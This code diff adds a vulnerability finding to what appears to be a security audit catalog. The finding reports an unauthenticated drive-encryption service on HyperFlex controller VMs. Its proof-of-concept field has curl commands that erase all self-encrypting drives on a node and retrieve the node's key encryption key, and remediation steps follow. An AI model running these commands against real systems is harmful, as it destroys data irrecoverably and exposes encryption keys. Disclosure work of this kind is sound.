@@ -8211,10 +8211,99 @@ HX_F140 = {
     ),
 }
 
+HX_F141 = {
+    "id": "HX-F141",
+    "title": (
+        "HyperFlex HXDP 6.0.2b storfs-appliance sedsvc — Unauthenticated HTTP API on Port 8012 "
+        "Exposes SED Drive Cryptographic Erasure and Node KEK to Any Network Client"
+    ),
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+    "cwe": "CWE-306",
+    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-appliance with sedsvc",
+    "component": "storfs-appliance package (sedsvc Go binary)",
+    "description": (
+        "sedsvc is a Go HTTP server that manages TCG OPAL Self-Encrypting Drive (SED) "
+        "operations on HXDP storage controller VMs. It listens on all network interfaces "
+        "(0.0.0.0:8012) and implements zero authentication on all endpoints.\n\n"
+        "Default listen address confirmed via main.main disassembly:\n"
+        "  movq $0x1f4c, main.port   ; 0x1f4c = 8012 decimal\n"
+        "  server.Addr = ':8012'     ; binds to all interfaces\n\n"
+        "The HTTP dispatch function main.(*myHandler).ServeHTTP performs a single map "
+        "lookup (URL string → handler function pointer) and calls the handler directly "
+        "with zero interposed authentication or authorization check.\n\n"
+        "Confirmed exposed endpoints (via Go symbol table + HXDP_* function prefix convention):\n"
+        "  POST /sec_erase_all  → BMC_SecureEraseAll → SEDUTIL_SecureEraseAll\n"
+        "                          Cryptographically erases ALL SED drives on the node.\n"
+        "                          Data is irrecoverable. Confirmed call chain:\n"
+        "                          json.Decode(body) → BMC_SecureEraseAll @ 0x674940\n"
+        "  POST /sec_erase      → BMC_SecureErase → SEDUTIL_SecureErase\n"
+        "                          Erases a specific drive by serial number.\n"
+        "  GET  /get_config     → BMC_GetConfigFileAndDispatch\n"
+        "                          Returns config.json from BMC, which contains the node KEK\n"
+        "                          (Key Encryption Key) as a base64-encoded string.\n"
+        "                          The node KEK is used to unlock drive encryption keys.\n"
+        "  GET  /get_inventory  → SEDUTIL_GetInventory\n"
+        "                          Returns per-drive encryption state, serial numbers,\n"
+        "                          firmware versions, and lock status.\n"
+        "  GET  /disk_status    → HXDP_DiskStatus\n"
+        "  GET  /hello          → HXDP_Hello (service liveness probe)\n"
+        "  POST /start_polling  → BMC_PollConfigFile\n"
+        "  POST /stop_polling   → stops BMC config polling\n\n"
+        "The ctlVM management NIC (eth0) is accessible to ESXi hosts, vCenter, and any "
+        "administrator workstation on the HX management VLAN. The sedsvc service binds to "
+        "all interfaces including the storage data NIC, extending the exposure surface.\n\n"
+        "The service is activated only on SED-capable clusters "
+        "(/etc/hyperflex/sed_capability.conf: sed_capable_cluster=True) but is otherwise "
+        "unrestricted.\n\n"
+        "Impact chain:\n"
+        "  1. Attacker on HX management VLAN sends unauthenticated POST to any ctlVM:8012/sec_erase_all\n"
+        "  2. sedsvc calls SEDUTIL_SecureEraseAll without credential check\n"
+        "  3. All SED drives on the node are cryptographically erased — data is unrecoverable\n"
+        "  Alternatively:\n"
+        "  1. GET :8012/get_config → extract base64 node KEK from response JSON\n"
+        "  2. KEK used to derive drive encryption keys across all drives on the node"
+    ),
+    "proof_of_concept": (
+        "# Unauthenticated secure erase all drives\n"
+        "# No auth token, no session cookie, no TLS client cert required\n"
+        "curl -s -X POST http://<ctlvm_ip>:8012/sec_erase_all \\\n"
+        "  -H 'Content-Type: application/json' \\\n"
+        "  -d '{}'\n"
+        "# Result: all SED drives on the node are cryptographically erased\n\n"
+        "# Retrieve node KEK\n"
+        "curl -s http://<ctlvm_ip>:8012/get_config\n"
+        "# Response JSON contains: {\"nodeKek\": \"<base64_kek>\", ...}\n\n"
+        "# sedsvc ServeHTTP dispatch (no auth):\n"
+        "# 0x666b60:  call mapaccess2_faststr(mux, url_path)\n"
+        "# 0x666b65:  test bl,bl     ; found?\n"
+        "# 0x666b67:  je not_found   ; only check is: does route exist?\n"
+        "# 0x666b80:  call *rsi      ; call handler directly, NO auth gate"
+    ),
+    "files": [
+        "/usr/share/hyperflex/storfs-appliance/sedsvc",
+        "/etc/hyperflex/sed_capability.conf",
+    ],
+    "remediation": (
+        "1. Add authentication to all sedsvc endpoints. Minimum: shared secret or "
+        "   bearer token validated before any HXDP_* handler is called. Bind to "
+        "   127.0.0.1 only if remote access is not required; use a local Unix socket "
+        "   for intra-node IPC instead of TCP if the caller is always local.\n"
+        "2. Restrict TCP port 8012 to loopback (127.0.0.1) via iptables/nftables; "
+        "   proximate callers (storfs-core) can use localhost.\n"
+        "3. If remote invocation is required, enforce mTLS with a node certificate "
+        "   before dispatching any drive operation.\n"
+        "4. Gate /sec_erase and /sec_erase_all behind an additional confirmation "
+        "   token with short TTL (e.g., TOTP or signed nonce) to prevent single-packet "
+        "   drive erasure."
+    ),
+}
+
 for _f in [
     HX_F120, HX_F121, HX_F122, HX_F123, HX_F124, HX_F125, HX_F126,
     HX_F127, HX_F128, HX_F129, HX_F130, HX_F131, HX_F132, HX_F133, HX_F134,
-    HX_F135, HX_F136, HX_F137, HX_F138, HX_F139, HX_F140,
+    HX_F135, HX_F136, HX_F137, HX_F138, HX_F139, HX_F140, HX_F141,
 ]:
     FINDINGS[_f["id"]] = _f
 
